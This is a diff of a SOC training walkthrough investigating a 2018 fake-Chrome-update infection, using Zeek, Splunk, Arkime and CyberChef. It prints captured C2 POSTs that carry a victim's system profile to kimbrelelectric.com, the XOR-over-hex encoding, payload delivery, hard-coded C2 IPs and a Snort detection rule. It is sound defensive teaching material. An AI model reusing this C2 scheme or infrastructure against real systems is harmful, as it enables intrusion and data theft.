-index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
+index=zeek sourcetype=zeek:http pcap_case=20180630_SORTING_THROUGH_THE_ALERTS host="bb17eb22.login3.kimbrelelectric.com"
 | eval t=strftime(ts,"%H:%M:%S.%3N")
-| table t id_orig_p id_resp_h id_resp_p method uri status_code request_body_len response_body_len resp_mime_types
+| table t uid id_orig_p id_resp_h method uri status_code user_agent request_body_len response_body_len resp_mime_types
 ```
 
-- `request_body_len` — bytes the PC **sent** in the POST body. `response_body_len` — bytes the server sent back.
+- `uid` = Zeek's ID for **one TCP connection**; same `uid` = same connection. `request_body_len` = bytes the PC sent in the body, `response_body_len` = bytes returned.
 
 ```text
-t              id_orig_p  id_resp_h      id_resp_p  method  uri         status  request_body_len  response_body_len  resp_mime_types
-20:28:47.389   49440      93.95.100.138  80         POST    /blank.gif  200     72                11866              text/plain
-20:28:48.186   49440      93.95.100.138  80         POST    /blank.gif  200     2644              348868             text/plain
-20:28:50.047   49440      93.95.100.138  80         POST    /blank.gif  200     256               0                  -
+t              uid                 id_orig_p  id_resp_h      method  uri         status  request_body_len  response_body_len  resp_mime_types
+20:28:47.389   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     72                11866              text/plain
+20:28:48.186   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     2644              348868             text/plain
+20:28:50.047   CwVJZs2YKLpHSE8LQ1  49440      93.95.100.138  POST    /blank.gif  200     256               0
 ```
 
-The DNS lookup just before:
+**[data] Reading:**
+
+- **One connection, three seconds, three POSTs** — a program following a script, not a person clicking.
+- **POST to `/blank.gif`** — you download a GIF, you do not post data to one. Camouflage for anyone skimming logs.
+- Rhythm: small (72) → large (2,644) → small (256) sent; medium (11.9 KB) → **very large (349 KB)** → nothing received. Something was **delivered**.
+
+### 4-2. The DNS lookup just before { #c2-dns }
 
 ```spl
-index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS query="*kimbrelelectric.com"
+index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_THROUGH_THE_ALERTS query="*kimbrelelectric.com"
 | eval t=strftime(ts,"%H:%M:%S.%3N")
-| table t query answers
+| table t id_resp_h query answers
 ```
 
 ```text
-t              query                                  answers
-20:28:46.647   bb17eb22.login3.kimbrelelectric.com    93.95.100.138
+t              id_resp_h   query                                 answers
+20:28:46.573   172.16.2.9  bb17eb22.login3.kimbrelelectric.com   93.95.100.138
 ```
 
-**Reading:**
+0.8 s before the first POST. Same /24 as the fake page.
 
-- **POST to `/blank.gif`.** A GIF is something you *download*; you do not POST data to an image. The name is camouflage.
-- Three POSTs on **one connection** (same source port 49440) in **three seconds**: small (72 B) → big (2,644 B) → small (256 B). Replies: 11.9 KB → **349 KB** → nothing. A script talking to its server, not a person.
-- **349 KB back** — much bigger than any command. Something was **delivered** (4-4).
-- `93.95.100.138` and the fake page's `93.95.100.178` are in the **same /24 network** — the same operator.
-- The sub-domain `bb17eb22.login3.` looks generated (8 hex characters) — a fresh name per victim or campaign.
+### 4-3. What came back (Splunk) { #c2-files }
 
-### 4-3. Reading the POST bodies (Arkime → CyberChef) { #decode-posts }
+Zeek treats every HTTP body as a file and hashes it.
 
-Zeek logs only the sizes. The bodies are in Arkime:
+```spl
+index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_THROUGH_THE_ALERTS tx_hosts="93.95.100.138"
+| eval t=strftime(ts,"%H:%M:%S.%3N")
+| table t tx_hosts rx_hosts mime_type seen_bytes md5
+```
+
+- `tx_hosts` = sender, `rx_hosts` = receiver, `mime_type` = type judged **from the content**.
 
 ```text
-tags == 20180630_SORTING_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
+t              tx_hosts       rx_hosts      mime_type   seen_bytes  md5
+20:28:48.503   93.95.100.138  172.16.2.169  text/plain  348868      dd83bbcc7dd4184b352f9882c3fe8408
+20:28:47.666   93.95.100.138  172.16.2.169  text/plain  11866       0e8a4bb8758c4ca91a3ee52395617ef9
 ```
 
-Expand the session. The request headers:
+**[data] Reading:** both replies are `text/plain`, and in Arkime they are long runs of **`0-9a-f`** — **hex text**. Two characters per byte, so 349 KB of text = **~174 KB of data**. An EXE sent as hex text has no `MZ` and no `application/x-dosexec`, so an "EXE download" search misses it. **The MD5 is of the hex text**, not of any file on disk.
+
+### 4-4. Request headers (Arkime) { #headers }
+
+```text
+tags == 20180630_SORTING_THROUGH_THE_ALERTS && host.http == bb17eb22.login3.kimbrelelectric.com
+```
 
 ```text
 POST /blank.gif HTTP/1.1
@@ -567,260 +717,229 @@ Age: 464b8967d47e14d7
 Content-Type: application/x-www-form-urlencoded
 UA-CPU: AMD64
 Accept-Encoding: gzip, deflate
-User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; ...)
+User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Win64; x64; Trident/7.0; .NET CLR 2.0.50727; SLCC2; ...)
 Host: bb17eb22.login3.kimbrelelectric.com
-```
+Content-Length: 72
+Connection: Keep-Alive
+Cache-Control: no-cache
 
-- **`Age:` in a request is wrong.** `Age` is a header that *caches send in replies*. Here it carries a 16-hex-character value, the same in all three POSTs — most likely a **victim/session ID**.
-- `UA-CPU: AMD64` — added by Windows' HTTP objects on 64-bit systems. Another sign of a script, not a browser.
-
-The three bodies:
-
-```text
 a=075d6d603e653c386b3969687b6c60686d6a7b6f606c686e6d6e646d686f6b646e6a7b
-b=8cdbebe6eeebecfdeae698fee89afeee988ea8bea9a8feee98b7b7b4a2bff5b6baa3acbeb7b7feee98...   (2,642 hex characters)
-c=d6c8f8f5fdf8ffeef9f58bedfb89edfd8b9dbbadbabbedfd8b848487918cb6f9e6858990edfd8b89b8...
 ```
 
-**How to recognise and break it:**
+**[data] Reading:**
 
-1. After `a=`, `b=`, `c=` only **`0–9 a–f`** appear → **hex** text. Hex → bytes gives garbage → **another layer**.
-2. Try **single-byte XOR** (only 256 keys). Pick the right key with a **crib** — text you expect inside. This is a form post (`Content-Type: application/x-www-form-urlencoded`), so the plain text should look like `name=value&name=value`. Use the crib **`&1=`**.
-
-**CyberChef recipe** (do each body separately; copy only the hex **after** `b=`):
-
-1. **From Hex**.
-2. **XOR Brute Force** — Key length `1`, Crib `&1=`. Note the key on the row that shows readable text.
-3. Replace step 2 with **XOR** — that key, **HEX**.
-4. **URL Decode** (turns `%5C` into `\`, `%3A` into `:` …).
-
-| Body | Key | Decoded (first characters are junk — ignore them) |
-|---|---|---|
-| `a=` (72 hex) | `5d` | `0=c8ae6d45&1=507&2=1530390526937&` |
-| `b=` (2,642 hex) | `db` | see below |
-| `c=` (254 hex) | `c8` | `0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&...&9=1530390529896&` |
-
-Body `b=` decoded (process list shortened):
-
-```text
-0=507
-&1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
-&2=AMD64
-&3=CONSERVATOR-PC
-&4=lloyd.maxwell
-&5=6
-&6=Windows_NT
-&7=FABULOUSDUKES
-&8=System manufacturer|
-&9=System Product Name|
-&10=031913 - 20130319;System Serial Number|
-&11=Windows Defender|
-&13=90:E2:BA:2D:C6:D6|
-&14=Enhanced (101- or 102-key)|...
-&16=1024x768|
-&17=System Idle Process|System|smss.exe|...|explorer.exe|...|chrome.exe|chrome.exe|...|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
-&18=2596
-&20=1530390528027
-```
-
-**Reading:**
-
-- **`a=`** — "hello": an ID (`c8ae6d45`), a number `507` (repeated in `b=` and `c=` — probably a campaign/build number) and the time in milliseconds (`1530390526937` = 20:28:46.937 UTC — the PC's clock agrees with the capture).
-- **`b=`** — a **PC profile**: where the script was run from (**`Downloads\Chrome_72.3.22.js`** — proves the user ran the Dropbox file), CPU, **host name, user, domain**, hardware and BIOS strings, **antivirus product (`Windows Defender`)**, a MAC address, keyboard, mouse, screen size and the **full process list**. `wscript.exe` is in the list — the script engine is running. This lets the attacker decide whether the PC is a real corporate target or a sandbox (screen 1024x768, generic "System manufacturer" strings…).
-- **Reply to `b=` = 349 KB.** The PC passed the check and was sent a payload.
-- **`c=`** — a report back: the payload was saved as **`C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe`** and run (`LLOYD~1.MAX` is the short 8.3 name of `lloyd.maxwell`). The reply is empty — nothing more to do.
-
-!!! question "Question: why is the key different for each body?"
-    The script picks a new one-byte key for each message (`5d`, `db`, `c8`); the first byte or two of each decoded body are probably how the server learns the key, which is why they look like junk. It does not matter for the analyst: **the crib finds the key every time**. What stays the same is the **form** — `a=`/`b=`/`c=` + hex + 1-byte XOR — and that form is what a detection should look for.
-
-!!! question "Question: the MAC in `13=` (90:E2:BA:2D:C6:D6) is not the MAC in the capture (00:13:d4:1f:a2:5e)"
-    `13=` is what the script read from Windows (a list ending in `|`, so possibly one of several adapters); the capture MAC is what was on the wire. A virtual or second adapter, or a re-written lab capture, can cause this. For the network the **on-wire MAC** is the fact; pass both to the host operator.
-
-### 4-4. The 349 KB reply — the payload { #payload }
-
-**Splunk** (Zeek treats every HTTP body as a file and hashes it):
-
-```spl
-index=zeek sourcetype=zeek:files pcap_case=20180630_SORTING_ALERTS tx_hosts="93.95.100.138"
-| eval t=strftime(ts,"%H:%M:%S")
-| table t tx_hosts rx_hosts mime_type seen_bytes md5 sha1
-```
-
-- `tx_hosts` = who sent the file, `rx_hosts` = who received it, `mime_type` = Zeek's guess from the content, `seen_bytes` = size.
-
-```text
-t         tx_hosts       rx_hosts      mime_type    seen_bytes  md5
-20:28:47  93.95.100.138  172.16.2.169  text/plain   11866       0e8a4bb8758c4ca91a3ee52395617ef9
-20:28:48  93.95.100.138  172.16.2.169  text/plain   348868      dd83bbcc7dd4184b352f9882c3fe8408
-```
-
-**Arkime:** the 348,868-byte reply is **hex text** again (`ca02a05b5aed8b82...`). So the real size of the data is half: **174,434 bytes**.
-
-**Reading:**
-
-- The payload is **not sent as an EXE** — no `MZ`, no `application/x-dosexec`, so a "find EXE downloads" search misses it. The script decodes it on the PC and writes `Chrome_72.3.22.exe` (body `c=`).
-- The MD5 above is of the **encoded** reply. It will **not** match the `.exe` on disk — the host operator must hash the file in `%TEMP%`.
-
-!!! note "Going further (optional) — it is an EXE inside"
-    Single-byte XOR brute force on the decoded 174 KB gives nothing. But long runs of the same bytes repeat every **90 bytes** — the sign of a **repeating XOR key** over a file that has many zero bytes (a Windows EXE has lots). Taking the most common byte in each of the 90 positions as the key gives a file starting `MZ ... This program cannot be run in DOS mode`, a 32-bit Windows EXE. Recovering a long key is malware-analysis work, not ticket work; the network conclusion is the same: **an encrypted Windows EXE was delivered**. Do not hash a file you rebuilt this way into the ticket — get the real one from the host.
+- **`Age:` does not belong in a request.** Caches put it in **replies**, and its value is seconds. Here the PC sends 16 hex characters, the same in every POST → **[inference]** a victim ID passed through a header.
+- `UA-CPU: AMD64` is added by Windows' scripting HTTP objects on 64-bit systems. With `MSIE 7.0` → **a Windows script, not a browser**.
+- `Content-Type: application/x-www-form-urlencoded` = form data, `name=value`. That is the key to decoding (next).
 
 **Ticket entry:**
 
 ```text
-[0041 261124, Sung] – Investigating HTTP POSTs from 172.16.2.169 to kimbrelelectric.com (WScript C2) – Found – Further Analysis Required
-[0058 261124, Sung] – Decoding C2 POST bodies in CyberChef – Found
+[2224 261124, Sung] – Investigating HTTP POSTs from 172.16.2.169 to bb17eb22.login3.kimbrelelectric.com – Found – Further Analysis Required
+```
+
+### 4-5. Decoding the POST bodies (CyberChef) { #decode-posts }
+
+No decoder function this time — it is inside the `.js` on the PC. So **read the shape**:
+
+1. After `a=` only `0-9a-f`, even length → **hex**. From Hex → unreadable bytes → **another layer**.
+2. The commonest simple layer is **1-byte XOR** — only 256 keys. Pick the right one with a **crib**: text that must be in the plain text. This is form data (`name=value&…`), and the outer names are single characters (`a=`, `b=`), so try **`&1=`**.
+
+**Recipe** (each body separately; copy only the hex **after** `a=`, `b=`, `c=`):
+
+1. **From Hex**
+2. **XOR Brute Force** — Key length `1`, Crib `&1=`. Note the key on the readable row.
+3. Replace it with **XOR** — that key, **HEX**.
+4. **URL Decode** (`%5C` → `\`, `%3A` → `:`, `%7C` → `|`).
+
+!!! note "Lengths"
+    Zeek's `request_body_len` includes the two characters `a=`. The hex part is therefore **70** characters for `a=`, **2,642** for `b=` and **254** for `c=`. Check `ABC` under Input — `b=` is wrapped over many lines in Arkime and easy to cut short.
+
+**`a=` — key `5d`**
+
+```text
+Z␀0=c8ae6d45&1=507&2=1530390526937&
+```
+
+The first one or two bytes are junk (probably key information) — ignore. `0=c8ae6d45` looks like an ID; `1=507` looks like a campaign/build number (it repeats in `b=` and `c=`); `2=` is **13 digits = epoch milliseconds**. CyberChef **From UNIX Timestamp** (Units: Milliseconds) or Splunk:
+
+```spl
+| makeresults
+| eval t=strftime(1530390526937/1000, "%Y-%m-%d %H:%M:%S.%3N")
+| table t
+```
+
+`| makeresults` creates one empty row to calculate on. Result **20:28:46.937 UTC** — the script's own clock, between the DNS lookup (46.573) and the POST (47.389). The message was built **at that moment, on that PC**.
+
+**`b=` — key `db`, then URL Decode**
+
+```text
+0=507
+1=C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js
+2=AMD64
+3=CONSERVATOR-PC
+4=lloyd.maxwell
+5=6
+6=Windows_NT
+7=FABULOUSDUKES
+8=System manufacturer|
+9=System Product Name|
+10=031913 - 20130319;System Serial Number|
+11=Windows Defender|
+12=
+13=90:E2:BA:2D:C6:D6|
+14=Enhanced (101- or 102-key)|Enhanced (101- or 102-key)|
+15=USB Input Device|
+16=1024x768|
+17=System Idle Process|System|smss.exe|...|explorer.exe|...|nvvsvc.exe|nvxdsync.exe|...|chrome.exe (x23)|wscript.exe|mscorsvw.exe|...|WmiPrvSE.exe|
+18=2596
+19=
+20=1530390528027
+```
+
+| No. | Meaning |
+|---|---|
+| **1** | **Where the script ran: the Downloads folder.** The Dropbox file was **executed** — this confirms 3-5 |
+| 3, 4, 7 | Host, user, **domain** — a company PC, a valuable target |
+| 8–10 | Default BIOS strings (common on self-built PCs) |
+| 11 | **Antivirus: Windows Defender only** |
+| 13–16 | Network card, keyboard, mouse, screen — "is this a real person's PC?" |
+| **17** | **Process list:** `wscript.exe` (the script engine — the identity of `MSIE 7.0`), 23 × `chrome.exe`, NVIDIA processes (matching the GPU in the TDS fingerprint), **no analysis tools** |
+| 20 | 20:28:48.027 UTC, 0.16 s before the POST |
+
+**[inference]** The attacker decides from this whether the PC is worth the next stage: domain-joined, real hardware, only the built-in AV. It passed — the **349 KB** reply came right after.
+
+!!! question "Question: where is `c=`?"
+    In the same Arkime session — the third POST. It did not show because Arkime displays the first **200 packets** by default, and this session has 299 + 296. `c=` comes **after** the 349 KB reply. Change **`200 packets`** to a larger value, switch **`Dst`** off to show only the PC's side, or Ctrl+F for `Content-Length: 256`. If something you expect is missing in Arkime, compare the session's packet count with the display limit first.
+
+    How was `c=` known to exist? From the analyst's data: 4-1 shows a third POST with a **256-byte** body. That it is called `c=` was an inference from `a=`, `b=` — and from the earlier analysis of this PCAP, which should have been said.
+
+**`c=` — key `c8`, then URL Decode**
+
+```text
+0=507&1=C:\Users\LLOYD~1.MAX\AppData\Local\Temp\Chrome_72.3.22.exe&2=0&3=0&4=1&5=0&6=0&7=0&8=0&9=1530390529896&
+```
+
+- **[data]** An **`.exe`** with the same name, in the user's **`%TEMP%`**. `LLOYD~1.MAX` is the 8.3 short name of `lloyd.maxwell` (how `%TEMP%` is often expanded). `9=` = 20:28:49.896 UTC. `2=`–`8=` look like status flags — meaning unknown.
+- **[inference]** The script decoded the 349 KB reply, saved it as `Chrome_72.3.22.exe`, ran it, and reported the path. Execution needs network proof → Step 5.
+
+!!! question "Question: are there rules for which decoding to try when?"
+    Yes — the character set says most of it. `0-9a-f`, even length → From Hex. `A-Z a-z 0-9 + /` with `=` at the end → From Base64. `%xx` → URL Decode (usually the **last** layer). `\x41` → Unescape string; `\u0041` → Unescape Unicode Characters; comma-separated decimals → From Charcode. Starts like `TVqQ` (Base64) / `4d5a` (hex) → an EXE; `H4sI` / `1f8b` → gzip. Unreadable bytes after a decode, low-to-medium Entropy → 1-byte XOR. **Crib** = text that must be there at **that** layer: `&1=` for form data, `http` for a URL, the host or user name found in baselining for a check-in, `This program` for an EXE. If XOR is followed by URL encoding, the crib for a path is `C%3A%5C`, not `C:\`.
+
+**Ticket entry:**
+
+```text
+[2235 261124, Sung] – Decoding POST bodies to kimbrelelectric.com in CyberChef – Found
 ```
 
 ---
 
-## Step 5 — After the payload: two C2 addresses that never answer { #followon }
+## Step 5 — After the payload: back to baseline candidates 1 and 2 { #followon }
 
-**Goal:** a new program on the PC usually starts talking to **its own** server. Look for **new external destinations after 20:28:50** (the last POST), especially ones with **no DNS name**.
+**Why this step:** `c=` says an EXE was **saved**. Saved is not run. **[inference]** A newly run malware program almost always contacts **its own C2** first. So the question becomes: *what new external traffic starts after 20:28:50?* The answer was already in the notes — 2-2 showed no new suspicious domains after 20:28:46, and 2-3 showed exactly two no-DNS IPs. They were unexplained in baselining; now they can be tested against the new fact.
 
-```spl
-index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_orig_h=172.16.2.169 ts>1530390530
-| where NOT cidrmatch("172.16.0.0/12", id_resp_h) AND NOT cidrmatch("224.0.0.0/4", id_resp_h)
-| stats min(ts) as first max(ts) as last count values(conn_state) as states sum(orig_bytes) as sent sum(resp_bytes) as received by id_resp_h id_resp_p
-| eval first=strftime(first,"%H:%M:%S"), last=strftime(last,"%H:%M:%S")
-| sort first
-```
+What the query looks for:
 
-- Line 1 `ts>1530390530` — only connections that **start after** 2018-06-30 20:28:50 UTC, written as epoch seconds. To get the number for any time, run `| makeresults | eval x=strptime("2018-06-30 20:28:50 +0000","%Y-%m-%d %H:%M:%S %z")` and read `x` (`makeresults` makes one empty row to calculate on; `%z` + `+0000` says the time is UTC).
-- Line 2 `cidrmatch("172.16.0.0/12", id_resp_h)` — true if the IP is in that range. `NOT ... AND NOT ...` drops internal and multicast addresses.
-- Line 3 — one row per destination IP and port: first/last time, number of connections, **`conn_state`** values, bytes each way.
-
-```text
-id_resp_h         id_resp_p  first     last      count  states  sent   received
-46.105.131.66     443        20:29:00  20:59:05  10     REJ     0      0
-107.170.231.118   4143       20:31:14  20:53:42  8      S0      0      0
-... (CDN / ad servers from the open CNN tab, all SF with data — 20:29–20:36)
-172.217.10.142    80         20:33:53  ...       1      SF      ...    ...      (redirector.gvt1.com — Chrome component update)
-...
-23.215.99.27      80         20:43:13  20:45:22  2      SF      454    1888     (crl.microsoft.com)
-```
-
-**What `conn_state` means here:**
-
-| conn_state | What happened | Here |
-|---|---|---|
-| `SF` | Normal start and finish, data both ways | Web traffic |
-| `REJ` | PC sent SYN, server answered **RST** — "nothing listening on that port" | 46.105.131.66:443 |
-| `S0` | PC sent SYN, **no answer at all** | 107.170.231.118:4143 |
-
-Did the PC look these IPs up in DNS?
+| Question | How |
+|---|---|
+| Did it start right after the EXE? | first `ts` vs `c=` (20:28:49.9) |
+| Program or person? | `delta` — a fixed rhythm |
+| Did any connection succeed? | `conn_state`, `history`, packet counts |
 
 ```spl
-index=zeek sourcetype=zeek:dns pcap_case=20180630_SORTING_ALERTS answers IN ("46.105.131.66","107.170.231.118")
-| table ts query answers
-```
-
-**Result: no rows** — the addresses were **built into the program**.
-
-The timing:
-
-```spl
-index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
+index=zeek sourcetype=zeek:conn pcap_case=20180630_SORTING_THROUGH_THE_ALERTS id_resp_h IN ("46.105.131.66","107.170.231.118")
 | sort ts
 | delta ts as gap
-| eval t=strftime(ts,"%H:%M:%S"), gap=round(gap,1)
-| table t id_orig_p id_resp_h id_resp_p conn_state gap
+| eval t=strftime(ts,"%H:%M:%S.%3N"), gap=round(gap,1)
+| table t id_orig_p id_resp_h id_resp_p conn_state history orig_pkts resp_pkts gap
 ```
 
-- `delta ts as gap` — seconds since the previous row.
+- `sort ts` first — `delta` works in row order. `delta ts as gap` = seconds since the previous row.
+- `history` = the TCP signals Zeek saw, **upper case from the PC, lower case from the server**: `S/s` SYN, `h` SYN-ACK, `R/r` RST, `D/d` data. `Sr` = "PC asked, server refused"; `S` = "PC asked, no answer".
 
 ```text
-t         id_orig_p  id_resp_h         id_resp_p  conn_state  gap
-20:29:00  49447      46.105.131.66     443        REJ
-20:29:01  49448      46.105.131.66     443        REJ         1.4
-20:31:14  49471      107.170.231.118   4143       S0          132.4
-20:31:35  49472      107.170.231.118   4143       S0          21.0
-20:36:10  49491      46.105.131.66     443        REJ         275.0
-20:36:11  49492      46.105.131.66     443        REJ         1.4
-20:38:30  49493      107.170.231.118   4143       S0          138.4
-20:38:51  49494      107.170.231.118   4143       S0          21.0
-20:43:37  49503      46.105.131.66     443        REJ         286.0
-20:43:38  49504      46.105.131.66     443        REJ         1.4
-20:45:53  49506      107.170.231.118   4143       S0          134.4
-20:46:14  49507      107.170.231.118   4143       S0          21.0
-20:51:14  49508      46.105.131.66     443        REJ         300.0
-20:51:15  49509      46.105.131.66     443        REJ         1.4
-20:53:21  49510      107.170.231.118   4143       S0          125.4
-20:53:42  49511      107.170.231.118   4143       S0          21.0
-20:59:04  49513      46.105.131.66     443        REJ         322.1
-20:59:05  49514      46.105.131.66     443        REJ         1.4
+t              id_orig_p  id_resp_h         id_resp_p  conn_state  history  orig_pkts  resp_pkts  gap
+20:29:00.525   49447      46.105.131.66     443        REJ         Sr       1          1
+20:29:01.159   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
+20:29:01.795   49447      46.105.131.66     443        REJ         Sr       1          1          0.6
+20:29:01.931   49448      46.105.131.66     443        REJ         Sr       1          1          0.1
+20:29:02.560   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
+20:29:03.200   49448      46.105.131.66     443        REJ         Sr       1          1          0.6
+20:31:14.351   49471      107.170.231.118   4143       S0          S        2          0          131.2
+20:31:23.351   49471      107.170.231.118   4143       S0          S        1          0          9.0
+20:31:35.352   49472      107.170.231.118   4143       S0          S        2          0          12.0
+20:31:44.349   49472      107.170.231.118   4143       S0          S        1          0          9.0
+20:36:10.366   49491      46.105.131.66     443        REJ         Sr       1          1          266.0
+...            (same pattern)
+20:59:06.815   49514      46.105.131.66     443        REJ         Sr       1          1          0.6
 ```
 
-**Reading:**
+**[data] Reading:**
 
-- The first attempt is **10 seconds after the payload was saved** (20:28:50 → 20:29:00). Nothing in the browsing explains these two IPs.
-- **Bare IPs, no DNS**, unusual port **4143**, and a fixed rhythm: IP 1 twice → ~2 min → IP 2 twice → ~5 min → repeat. Each round ≈ **7.5 minutes**, until the capture ends. That is a **program working through a C2 list**, not a person.
-- **No connection ever succeeded**, so **no C2 data**, no commands, no further downloads. The servers were already down or blocked when this traffic was recorded.
-- Hard-coded IP:port C2 on 443 and odd high ports, started by the payload of a fake-update infection, is how **Dridex** (banking trojan) behaved in 2018. Without a working session, a hash or a signature, this stays **"consistent with Dridex (unconfirmed)"**.
+- **First attempt 20:29:00.525 — about 10 s after `c=`.**
+- **46.105.131.66:443 — `Sr`, 1 packet each way.** The server is up but nothing listens on 443; it refuses. Windows retries a refused connection twice, 0.6 s apart, then tries again on a new port → **6 rows per round**. Zeek closes a connection on RST, so each retry is a new row: 6 × 5 rounds = the **30** in 2-3.
+- **107.170.231.118:4143 — `S`, no reply at all.** Server down or packets dropped on the way. Windows re-sends the SYN with growing gaps (~3 s, ~6 s), gives up after ~9 s, tries a new port. Zeek splits each port into two rows after the idle gap → 4 rows × 4 rounds = **16**.
+- Arkime shows the same: `SYN 1  SYN-ACK 0  RST 1`, Databytes 0.
 
-!!! question "Question: if nothing connected, is the PC still infected?"
-    Yes. The network shows a program **on the PC** trying to reach its C2 every few minutes. The C2 being dead protects the PC only **today**: the malware may have more addresses, may get them later, or the servers may come back. The ticket says "infected, follow-on C2 not working". The host still needs cleaning and the user's passwords should be treated as exposed (banking trojans steal them).
+**Rounds:**
 
-!!! question "Question: what can the host operator look for?"
-    From this traffic:
+| 46.105.131.66 | then, after ~2 min | 107.170.231.118 |
+|---|---|---|
+| 20:29:00 | → | 20:31:14 |
+| 20:36:10 | → | 20:38:30 |
+| 20:43:37 | → | 20:45:53 |
+| 20:51:14 | → | 20:53:21 |
+| 20:59:04 | (capture ends) | |
 
-    - `C:\Users\lloyd.maxwell\Downloads\Chrome_72.3.22.js` and `C:\Users\lloyd.maxwell\AppData\Local\Temp\Chrome_72.3.22.exe` — collect and hash.
-    - `wscript.exe` started from `explorer.exe` around 20:28:46 UTC (Event 4688 / Sysmon 1).
-    - What the EXE left behind (it may have moved itself) — Run keys, scheduled tasks, new DLLs in `%APPDATA%`.
-    - Chrome history for `www.stmarybahrain.com` and the fake page at 20:27:53–20:27:57.
+The two IPs **alternate**: IP 1 → ~2 min → IP 2 → ~5 min → repeat, a cycle of ~7.5 minutes until the capture ends. **[inference]** A program working through a built-in C2 list and sleeping between rounds.
 
-**Ticket entry:**
+**Conclusion:**
+
+- **[data]** 10 s after the EXE report: two hard-coded IPs, fixed rhythm, **never connected**. No C2 commands, no further downloads, no exfiltration on the network.
+- **[inference]** `%TEMP%\Chrome_72.3.22.exe` **ran** and tried its C2. Hard-coded IP:port C2 on 443 and odd high ports after a fake-update infection matches how **Dridex** behaved in 2018 — without a hash or signature the ticket says "consistent with Dridex (unconfirmed)".
+- A dead C2 protects the PC only today. The host is infected: clean it, and treat the user's passwords as exposed.
+
+**Ticket entries:**
 
 ```text
-[0109 261124, Sung] – Looking for new external connections by 172.16.2.169 after the payload download – Found
+[1951 261124, Sung] – Looking for external connections by 172.16.2.169 without a DNS lookup – Found
+[2329 261124, Sung] – Investigating repeated connection attempts from 172.16.2.169 to 46.105.131.66 and 107.170.231.118 after the payload download – Found
 ```
 
 ---
 
 ## Step 6 — One simple Snort rule { #snort }
 
-The most specific thing the network shows is the C2 host. One plain content match:
+| Candidate | For | Against |
+|---|---|---|
+| **C2 domain `kimbrelelectric.com`** | Confirmed post-execution traffic; plain HTTP | The domain can change |
+| `/chromefiles/` | Catches the pre-infection stage | Other sites may use the name |
+| The two C2 IPs | Catches the failed C2 | No content; IPs change easily |
 
 ```text
 alert tcp $HOME_NET any -> $EXTERNAL_NET 80 (msg:"SocGholish C2 kimbrelelectric.com - Sung"; content:"kimbrelelectric.com"; nocase; sid:1000041; rev:1;)
 ```
 
-- `alert tcp $HOME_NET any -> $EXTERNAL_NET 80` — TCP from any inside port to port 80 outside (HTTP).
-- `msg:"..."` — the alert text, author at the end.
-- `content:"kimbrelelectric.com"; nocase;` — the packet contains this text, upper or lower case. It is in the `Host:` header of every POST.
-- `sid:1000041; rev:1;` — own rule number (1000000+) and version.
+- `$HOME_NET any -> $EXTERNAL_NET 80` — inside to outside port 80. `content` + `nocase` — the text anywhere in the packet, any case (it is in each POST's `Host:` header). `sid` 1000000+ = own rules. The generated sub-domain (`bb17eb22.login3.`) is left out on purpose — it may change per victim.
 
-**Expected: 3 alerts** — the three POST packets on port 49440. DNS lookups for the name are UDP, so this TCP rule does not fire on them.
-
-**Test it** (full beginner's steps: [Night Dew, second pass — 6-3](night-dew-arkime-splunk-netlogon-bruteforce.md#snort-test)):
+Add the rule on **one line** to `\\10.50.10.60\rules\local.rules`, then on pcapbox:
 
 ```bash
 sudo snort -T -c /etc/snort/snort.conf 2>&1 | tail -5
-snort-test 20180630_SORTING_ALERTS
-```
-
-- `-T` — syntax check only. Look for `Snort successfully validated the configuration!`.
-- `snort-test <case>` — pcapbox helper: runs the rules on `/data/pcap/<case>.pcap` and counts alerts per rule.
-
-```text
-     3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
-```
-
-By hand, with times:
-
-```bash
-sudo snort -c /etc/snort/snort.conf -r /data/pcap/20180630_SORTING_ALERTS.pcap -A console -q -k none -U -y -l /tmp/snortlog
+snort-test 20180630_SORTING_THROUGH_THE_ALERTS
 ```
 
 ```text
-06/30/18-20:28:47.389809  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
-06/30/18-20:28:48.186564  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
-06/30/18-20:28:50.047505  [**] [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung [**] [Priority: 0] {TCP} 172.16.2.169:49440 -> 93.95.100.138:80
+[1/2] 문법 OK
+[2/2] /data/pcap/20180630_SORTING_THROUGH_THE_ALERTS.pcap
+  개수 [gid:sid:rev] 메시지
+      3 [1:1000041:1] SocGholish C2 kimbrelelectric.com - Sung
 ```
 
-Same times and port as Zeek's `http.log` — tools agree.
+**3 alerts** = the three POSTs. The DNS lookup has the name too, but DNS is UDP and the rule is TCP.
 
-!!! note "A domain rule is the simplest, not the strongest"
-    The attacker can change the domain tomorrow. Stronger ideas for later (not needed for this ticket): a POST to `/blank.gif` with `a=`/`b=`/`c=` and only hex after it; an `Age:` header in a **request**; the `MSIE 7.0` + `UA-CPU` User-Agent to a domain never seen before.
+!!! warning "`sudo pcap-ingest: command not found` — and do not re-ingest anyway"
